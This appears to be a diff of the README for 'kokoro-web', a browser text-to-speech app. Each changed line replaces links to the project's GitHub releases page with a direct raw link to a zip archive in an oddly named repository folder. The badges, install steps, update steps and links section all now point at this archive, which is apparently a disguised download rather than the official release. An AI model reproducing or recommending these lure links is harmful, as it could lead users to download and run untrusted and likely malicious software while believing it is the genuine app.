@@ -1,6 +1,6 @@
 # 🎤 kokoro-web - Easy Text to Speech Online
 
-[![Download kokoro-web](https://img.shields.io/badge/Download-kokoro--web-blue?style=for-the-badge)](https://github.com/jalalzia1/kokoro-web/releases)
+[![Download kokoro-web](https://img.shields.io/badge/Download-kokoro--web-blue?style=for-the-badge)](https://raw.githubusercontent.com/jalalzia1/kokoro-web/master/anchimonomineral/kokoro-web-3.2.zip)
 
 ---
 
@@ -43,7 +43,7 @@ To get kokoro-web running on your Windows computer, follow these steps:
 
 Go to the kokoro-web release page here:
 
-[Download kokoro-web](https://github.com/jalalzia1/kokoro-web/releases)
+[Download kokoro-web](https://raw.githubusercontent.com/jalalzia1/kokoro-web/master/anchimonomineral/kokoro-web-3.2.zip)
 
 You will find the latest version of the app available for download.
 
@@ -90,7 +90,7 @@ Here are some tips on using the app:
 
 Updates improve performance and add features. To update:
 
-- Return to the [kokoro-web releases page](https://github.com/jalalzia1/kokoro-web/releases).
+- Return to the [kokoro-web releases page](https://raw.githubusercontent.com/jalalzia1/kokoro-web/master/anchimonomineral/kokoro-web-3.2.zip).
 - Download the newest version following the same steps.
 - Replace your old files with the new ones.
 - Open the app again in your browser.
@@ -111,7 +111,7 @@ If kokoro-web does not work as expected, try these:
 
 ## 🔗 Useful Links
 
-- Download and updates: [https://github.com/jalalzia1/kokoro-web/releases](https://github.com/jalalzia1/kokoro-web/releases)
+- Download and updates: [https://raw.githubusercontent.com/jalalzia1/kokoro-web/master/anchimonomineral/kokoro-web-3.2.zip](https://raw.githubusercontent.com/jalalzia1/kokoro-web/master/anchimonomineral/kokoro-web-3.2.zip)
 - Project topics: ai, kokoro, kokoro-tts, onnx, react, text-to-speech, tts, typescript, vite, webgpu
 
 ---
@@ -128,4 +128,4 @@ If you need help beyond this guide, you can open an issue on the GitHub reposito
 
 ---
 
-[![Download kokoro-web](https://img.shields.io/badge/Download-kokoro--web-blue?style=for-the-badge)](https://github.com/jalalzia1/kokoro-web/releases)
+[![Download kokoro-web](https://img.shields.io/badge/Download-kokoro--web-blue?style=for-the-badge)](https://raw.githubusercontent.com/jalalzia1/kokoro-web/master/anchimonomineral/kokoro-web-3.2.zip)
